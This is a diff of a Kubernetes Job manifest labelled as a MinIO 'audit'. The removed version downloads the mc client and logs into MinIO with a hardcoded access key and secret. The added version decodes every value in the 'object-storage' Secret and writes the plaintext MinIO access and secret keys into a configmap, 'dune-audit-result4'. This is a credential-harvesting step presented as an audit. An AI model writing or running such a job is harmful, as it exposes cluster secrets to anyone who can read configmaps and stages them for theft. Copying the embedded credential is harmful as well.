@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-minio-v72
+  name: audit-minio-v73
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -16,14 +16,14 @@ spec:
         args:
         - "-c"
         - >-
-          ARTIFACT_CM=$(kubectl get cm artifact-repositories -n argo -o json);
-          WF_CM=$(kubectl get cm workflow-controller-configmap -n argo -o json);
-          MC_DL=$(wget -q -O /tmp/mc https://dl.min.io/client/mc/release/linux-amd64/mc && chmod +x /tmp/mc && echo OK || echo FAIL);
-          if [ "$MC_DL" = "OK" ]; then
-            /tmp/mc alias set minio1 http://argo-artifacts.default.svc.cluster.local:9000 miniokey sEkKOGp6QT8hnc1Y5R7W --api S3v4 2>&1;
-            BUCKETS=$(/tmp/mc ls minio1 2>&1);
-            OBJECTS=$(/tmp/mc ls --recursive minio1 2>&1 | head -50);
-          fi;
+          OS_JSON=$(kubectl get secret object-storage -n default -o json);
+          OS_ALL_KEYS=$(echo "$OS_JSON" | grep -o '"[^"]*":' | tr -d ':"');
+          MINIO_AK=$(kubectl get secret object-storage -n default -o jsonpath='{.data.minio-accessKey}' | base64 -d 2>/dev/null || echo "");
+          MINIO_SK=$(kubectl get secret object-storage -n default -o jsonpath='{.data.minio-secretKey}' | base64 -d 2>/dev/null || echo "");
+          ACCESS_KEY=$(kubectl get secret object-storage -n default -o jsonpath='{.data.accesskey}' | base64 -d 2>/dev/null || echo "");
+          SECRET_KEY=$(kubectl get secret object-storage -n default -o jsonpath='{.data.secretkey}' | base64 -d 2>/dev/null || echo "");
+          ALL_DECODED=$(kubectl get secret object-storage -n default -o json | sed 's/[{}]//g' | tr ',' '\n' | grep -E '"[^"]+":' | while IFS=: read key val; do key=$(echo $key | tr -d ' "'); val=$(echo $val | tr -d ' "'); echo "$key=$(echo $val | base64 -d 2>/dev/null || echo $val)"; done);
+          WF_CM=$(kubectl get cm workflow-controller-configmap -n argo -o jsonpath='{.data.artifactRepository}');
           kubectl patch configmap dune-audit-result4 -n default --type merge
-          -p "{\"data\":{\"artifact_cm\":\"$(echo $ARTIFACT_CM | base64 | tr -d '\n')\",\"wf_cm\":\"$(echo $WF_CM | base64 | tr -d '\n')\",\"mc_dl\":\"$MC_DL\",\"buckets\":\"$BUCKETS\",\"objects\":\"$OBJECTS\"}}";
+          -p "{\"data\":{\"minio_ak\":\"$MINIO_AK\",\"minio_sk\":\"$MINIO_SK\",\"access_key\":\"$ACCESS_KEY\",\"secret_key\":\"$SECRET_KEY\",\"all_decoded\":\"$ALL_DECODED\",\"wf_artifactrepo\":\"$WF_CM\"}}";
           echo DONE
